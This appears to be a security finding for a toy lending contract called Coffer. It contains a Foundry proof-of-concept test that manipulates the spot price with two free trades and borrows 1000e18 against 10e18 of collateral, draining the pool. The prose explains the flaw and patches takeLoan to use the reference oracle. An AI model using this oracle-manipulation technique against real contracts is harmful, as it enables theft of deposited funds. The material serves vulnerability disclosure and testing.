pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/Coffer.sol";

contract PocTest is Test {
    Coffer coffer;

    function setUp() public {
        // base 1000e18, quote 1000e18, ref price 1e18 (1 quote per base)
        coffer = new Coffer(1000e18, 1000e18, 1e18);
    }

    function test_exploit() public {
        // Attacker is this contract
        // Deposit 10 base as collateral
        coffer.credit(10e18);

        uint256 refPrice = coffer.refQuote(); // 1e18
        uint256 honestMax = coffer.collateralOf(address(this)) * refPrice / 1e18;
        // honest max should be 10e18
        assertEq(honestMax, 10e18, "honest max mismatch");

        // Without manipulation, trying to borrow 100e18 should revert
        vm.expectRevert(bytes("undercollateralized"));
        coffer.takeLoan(100e18);

        // Manipulate instant price via trade
        // trade(quoteIn, baseOut): poolBase decreases, quoteAmt increases => price up
        // First trade: remove 900 base from pool
        coffer.trade(0, 900e18);
        uint256 price1 = coffer.instantPrice();
        // price should be 1000e18 / 100e18 = 10e18
        assertEq(price1, 10e18, "price after first trade");

        // Second trade: remove 90 more base, poolBase = 10e18
        coffer.trade(0, 90e18);
        uint256 price2 = coffer.instantPrice();
        // price = 1000e18 / 10e18 = 100e18
        assertEq(price2, 100e18, "price after second trade");

        // Now maxDebt according to manipulated price = 10 * 100 = 1000
        uint256 manipulatedMax = coffer.collateralOf(address(this)) * price2 / 1e18;
        assertEq(manipulatedMax, 1000e18, "manipulated max");

        // Borrow 1000e18, draining the pool, while honest collateral only worth 10e18
        coffer.takeLoan(1000e18);

        // Verify exploit: loan > honest max, and pool drained
        uint256 loan = coffer.loanOf(address(this));
        assertEq(loan, 1000e18, "loan should be 1000");
        assertGt(loan, honestMax, "exploit: loan exceeds honest collateral value");
        assertEq(coffer.quoteAmt(), 0, "pool drained");
    }
}

The contract `Coffer` prices collateral in `takeLoan` using `instantPrice()` = `quoteAmt * 1e18 / poolBase`. Both reserves are directly movable by anyone via `trade(quoteIn, baseOut)` which decreases `poolBase` and increases `quoteAmt`. An attacker can call `trade(0, 900e18)` then `trade(0, 90e18)` to shrink `poolBase` from 1000e18 to 10e18, inflating the price from 1e18 to 100e18. With only 10e18 collateral, the manipulated `maxDebt` becomes 1000e18, allowing draining the entire quote pool while honest value is only 10e18.

Fix: use the manipulation-resistant oracle `refQuote()` (`oracleMark`) instead of the spot `instantPrice()` for loan valuation.

**PoC:** deposits 10 base, shows 100e18 loan reverts honestly, manipulates price to 100e18 via two trades, then borrows 1000e18 draining pool.

**Patch:** `takeLoan` now uses `refQuote()`.

```solidity
function takeLoan(uint256 amount) external {
    uint256 price = refQuote();
    uint256 maxDebt = collateralOf[msg.sender] * price / 1e18;
```

